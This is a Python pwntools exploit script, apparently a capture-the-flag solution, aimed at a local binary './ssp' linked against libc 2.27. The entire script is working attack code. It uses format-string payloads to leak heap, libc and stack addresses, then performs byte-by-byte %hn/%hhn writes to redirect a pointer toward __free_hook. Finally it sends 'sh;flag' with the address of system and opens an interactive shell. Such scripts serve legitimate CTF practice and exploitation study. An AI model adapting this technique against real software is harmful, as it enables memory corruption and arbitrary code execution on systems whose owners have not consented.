from pwn import *

local=1
pc='./ssp'
remote_addr=['',0]
aslr=True
context.log_level=True

libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

if local==1:
    #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    p = process(pc,aslr=aslr)
    #gdb.attach(p,'c')
else:
    p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def cmd(command):
    sla("$ ",command)

if __name__ == '__main__':
    cmd("%7$lx#")
    heap_addr=int(ru("#")[:-1],16)-0x53a0
    lg("heap address",heap_addr)
    #raw_input()
    cmd("%19$lx#")
    libc_addr=int(ru("#")[:-1],16)-0x21b97
    lg("libc address",libc_addr)
    libc.address=libc_addr
    cmd("%21$lx#")
    stack_addr=int(ru("#")[:-1],16)-0xb0-0x30
    lg("stack address",stack_addr)
    onegadget=0x4f322+libc_addr
    target=heap_addr+0x148
    malloc_hook=libc.symbols['__malloc_hook']
    free_hook=libc.symbols['__free_hook']
    a=p64(target)
    c=p64(free_hook-8)
    for i in range(6):
        off=stack_addr&0xFFFF
        off+=i
        cmd("%"+str(off)+'d%21$hn')
        b=u8(a[i])
        s="%"+str(b)+"d%47$hhn"
        cmd(s)
    off=stack_addr&0xFFFF
    cmd("%"+str(off)+'d%21$hn')
    for i in range(6):
        b=u8(a[0])+i
        s="%"+str(b)+"d%47$hhn"
        cmd(s)
        b=u8(c[i])
        s="%"+str(b)+"d%19$hhn"
        cmd(s)
    cmd('c')
    cmd("3")
    sleep(0.5)
    sl("sh;flag".ljust(0x8,'\x00')+p64(libc.symbols['system']))
    p.interactive()
